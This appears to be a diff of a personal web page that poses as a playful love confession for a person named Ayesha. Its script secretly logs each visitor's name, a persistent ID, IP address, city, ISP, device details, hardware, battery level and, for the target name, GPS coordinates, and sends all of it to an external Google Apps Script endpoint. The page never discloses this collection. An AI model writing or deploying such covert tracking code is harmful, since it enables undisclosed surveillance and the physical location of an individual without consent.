@@ -57,13 +57,13 @@ Did You Come From Kite's YT link ?
 <button onclick="startAnswer('yes')">Yes</button>
 <button onclick="startAnswer('no')">No</button>
 </div>
-    
-
 
 </div>
 
 <script>
+
 const SHEET_URL = "https://script.google.com/macros/s/AKfycbw4NnLlhaiDAkbBicfYbZkjd48lpAnFPIlEbSnTojbAU-_PSLwLwFBHQXKdtnRK8kkl/exec";
+
 let visitorId = localStorage.getItem("visitor_id");
 
 if (!visitorId) {
@@ -71,14 +71,14 @@ if (!visitorId) {
     localStorage.setItem("visitor_id", visitorId);
 }
 
-// visit counter
+// Visit counter
 let visitCount = Number(localStorage.getItem("visit_count") || 0) + 1;
 localStorage.setItem("visit_count", visitCount);
 
-// NEW or RETURNING (based on first visit)
+// NEW or RETURNING
 let isReturning = visitCount > 1;
 
-// store first visit time only once
+// Store first visit time only once
 let firstVisitTime = localStorage.getItem("first_visit_time");
 
 if (!firstVisitTime) {
@@ -87,9 +87,9 @@ if (!firstVisitTime) {
 }
 
 let currentVisitTime = new Date().toLocaleString();
-    
 
 function logData(name,event){
+
     fetch(SHEET_URL,{
         method:"POST",
         body:JSON.stringify({
@@ -97,258 +97,253 @@ function logData(name,event){
             event:event
         })
     }).catch(()=>{});
+
 }
 
 function startAnswer(answer){
 
-    if(answer==="no"){
-        document.getElementById("text").innerHTML="Access denied.";
-        document.getElementById("buttons").innerHTML="";
+    if(answer === "no"){
+
+        document.getElementById("text").innerHTML =
+        "Access denied.";
+
+        document.getElementById("buttons").innerHTML = "";
+
         return;
     }
 
-    document.getElementById("text").innerHTML=
+    document.getElementById("text").innerHTML =
     "What is your name?<br><small>It will only work for the right person.</small>";
 
-    document.getElementById("buttons").innerHTML=
+    document.getElementById("buttons").innerHTML =
     '<input id="nameInput" placeholder="Enter your name"><br><br><button onclick="checkName()">Submit</button>';
+
 }
 
 function checkName(){
 
-     let name=document.getElementById("nameInput")
+    let name = document.getElementById("nameInput")
         .value
         .trim()
         .toLowerCase();
 
     alert("NAME = " + name);
-logData(name,"name_entered");
-   logData(name, "visitor_id: " + visitorId);
 
-logData(name, "user_type: " + (isReturning ? "RETURNING" : "NEW"));
+    logData(name,"name_entered");
 
-logData(name, "visit_count: " + visitCount);
+    logData(name, "visitor_id: " + visitorId);
 
-logData(name, "first_visit: " + firstVisitTime);
+    logData(name, "user_type: " + (isReturning ? "RETURNING" : "NEW"));
 
-logData(name, "current_visit: " + currentVisitTime); 
-   fetch("https://ipapi.co/json/")
-.then(response => response.json())
-.then(data => {
-      logData(
-        name,
-        "IP: " + data.ip
-    );
+    logData(name, "visit_count: " + visitCount);
 
+    logData(name, "first_visit: " + firstVisitTime);
+
+    logData(name, "current_visit: " + currentVisitTime);
+
+    // IP information
+    fetch("https://ipapi.co/json/")
+    .then(response => response.json())
+    .then(data => {
+
+        logData(
+            name,
+            "IP: " + data.ip
+        );
+
+        logData(
+            name,
+            "City: " + data.city
+        );
+
+        logData(
+            name,
+            "region: " + data.region
+        );
+
+        logData(
+            name,
+            "country: " + data.country_name
+        );
+
+        logData(
+            name,
+            "ISP: " + (data.org || "unknown")
+        );
+
+    });
+
+    // Device information
     logData(
         name,
-        "City: " + data.city
+        "device: " + navigator.userAgent
     );
-    
-    logData(
-    name,
-    "region: " + data.region
-);
 
-logData(
-    name,
-    "country: " + data.country_name
-);
-    
-    logData(
-    name,
-    "ISP: " + (data.org || "unknown")
-);
-
-}); 
-    logData(
-    name,
-    "device: " + navigator.userAgent
-);
     let deviceType =
-/Mobi|Android/i.test(navigator.userAgent)
-? "Mobile"
-: "Desktop";
+    /Mobi|Android/i.test(navigator.userAgent)
+    ? "Mobile"
+    : "Desktop";
 
-logData(
-    name,
-    "device_type: " + deviceType
-);
-alert(
-    "Screen: " + screen.width + "x" + screen.height +
-    "\nCPU: " + navigator.hardwareConcurrency
-);
     logData(
-    name,
-    "screen: " +
-    screen.width +
-    "x" +
-    screen.height
-);
+        name,
+        "device_type: " + deviceType
+    );
+
+    alert(
+        "Screen: " + screen.width + "x" + screen.height +
+        "\nCPU: " + navigator.hardwareConcurrency
+    );
+
     logData(
-    name,
-    "cpu_cores: " + navigator.hardwareConcurrency
-);
+        name,
+        "screen: " +
+        screen.width +
+        "x" +
+        screen.height
+    );
 
-logData(
-    name,
-    "ram_gb: " + navigator.deviceMemory
-);
-  function sendBattery(){
-    if (!navigator.getBattery) {
-        logData(name, "battery: not_supported");
-        return;
-    }
+    logData(
+        name,
+        "cpu_cores: " + navigator.hardwareConcurrency
+    );
 
-    navigator.getBattery().then(function(battery){
+    logData(
+        name,
+        "ram_gb: " + navigator.deviceMemory
+    );
 
-        let level = Math.round(battery.level * 100);
+    // Battery information
+    function sendBattery(){
 
-        if (isNaN(level)) {
-            logData(name, "battery: unknown");
-        } else {
-            logData(name, "battery: " + level + "%");
+        if (!navigator.getBattery) {
+
+            logData(name, "battery: not_supported");
+
+            return;
         }
 
-    }).catch(function(){
-        logData(name, "battery: blocked");
-    });
-}
+        navigator.getBattery().then(function(battery){
 
-sendBattery();
+            let level = Math.round(battery.level * 100);
 
+            if (isNaN(level)) {
 
-    if(name!=="ayesha"){
-        document.getElementById("text").innerHTML="Wrong person.";
-        document.getElementById("buttons").innerHTML="";
+                logData(name, "battery: unknown");
+
+            } else {
+
+                logData(name, "battery: " + level + "%");
+
+            }
+
+        }).catch(function(){
+
+            logData(name, "battery: blocked");
+
+        });
+
+    }
+
+    sendBattery();
+
+    // Check name
+    if(name !== "ayesha"){
+
+        document.getElementById("text").innerHTML =
+        "Wrong person.";
+
+        document.getElementById("buttons").innerHTML = "";
+
         return;
     }
-    navigator.geolocation.getCurrentPosition(
-function(position){
 
-    logData(
-        name,
-        "gps: " +
-        position.coords.latitude +
-        "," +
-        position.coords.longitude
+    // GPS location
+    navigator.geolocation.getCurrentPosition(
+
+        function(position){
+
+            logData(
+                name,
+                "gps: " +
+                position.coords.latitude +
+                "," +
+                position.coords.longitude
+            );
+
+        },
+
+        function(){
+
+            logData(name,"location_denied");
+
+        }
+
     );
 
-},
-function(){
-    logData(name,"location_denied");
-}
-);
-
-    document.getElementById("text").innerHTML=
+    document.getElementById("text").innerHTML =
     "Are you mad at me?";
 
-    document.getElementById("buttons").innerHTML=
+    document.getElementById("buttons").innerHTML =
     '<button onclick="madAnswer(\'yes\')">Yes</button><button onclick="madAnswer(\'no\')">No</button>';
+
 }
 
 function madAnswer(answer){
 
-    if(answer==="yes"){
+    if(answer === "yes"){
 
-        document.getElementById("text").innerHTML=
+        document.getElementById("text").innerHTML =
         "Sorry... I wanted to tell you something.";
 
     }else{
 
-        document.getElementById("text").innerHTML=
+        document.getElementById("text").innerHTML =
         "Okay okay good.<br><br>Wanna hear something?";
+
     }
 
-    document.getElementById("buttons").innerHTML=
+    document.getElementById("buttons").innerHTML =
     '<button onclick="finalTyping()">Okayyy</button><button onclick="dontWannaHear()">Don\'t wanna hear</button>';
+
 }
 
 function dontWannaHear(){
 
-    document.getElementById("text").innerHTML="plzz";
+    document.getElementById("text").innerHTML =
+    "plzz";
 
-    document.getElementById("buttons").innerHTML=
+    document.getElementById("buttons").innerHTML =
     '<button onclick="finalTyping()">Okayyy</button><button onclick="dontWannaHear()">Nooo</button>';
+
 }
 
 function finalTyping(){
 
-    document.getElementById("buttons").innerHTML="";
+    document.getElementById("buttons").innerHTML = "";
 
-    let text=document.getElementById("text");
+    let text = document.getElementById("text");
 
-    let message=
+    let message =
     "bishh i love you , do you really not get it?";
 
-    let i=0;
+    let i = 0;
 
-    text.innerHTML="";
+    text.innerHTML = "";
 
-    let typing=setInterval(()=>{
+    let typing = setInterval(() => {
 
-        text.innerHTML=message.substring(0,i+1);
+        text.innerHTML = message.substring(0, i + 1);
 
         i++;
 
-        if(i>=message.length){
+        if(i >= message.length){
 
             clearInterval(typing);
-
-            setTimeout(()=>{
-
-                document.getElementById("text").innerHTML=
-                "Wanna hear more?";
-
-                document.getElementById("buttons").innerHTML=
-                '<button onclick="jokeReveal()">Yes</button><button onclick="hearMoreNo()">Nooo</button>';
-
-            },2000);
 
         }
 
     },120);
-}
 
-function hearMoreNo(){
-
-    document.getElementById("text").innerHTML="plzz";
-
-    setTimeout(()=>{
-
-        document.getElementById("text").innerHTML=
-        "Wanna hear more?";
-
-        document.getElementById("buttons").innerHTML=
-        '<button onclick="jokeReveal()">Yes</button><button onclick="hearMoreNo()">Nooo</button>';
-
-    },1000);
-}
-
-function jokeReveal(){
-
-    document.getElementById("buttons").innerHTML="";
-
-    let text=document.getElementById("text");
-
-    let message=
-    "Nah, did you really believe that? I was just joking.";
-
-    let i=0;
-
-    text.innerHTML="";
-
-    let typing=setInterval(()=>{
-
-        text.innerHTML=message.substring(0,i+1);
-
-        i++;
-
-        if(i>=message.length){
-            clearInterval(typing);
-        }
-
-    },120);
 }
 
 </script>
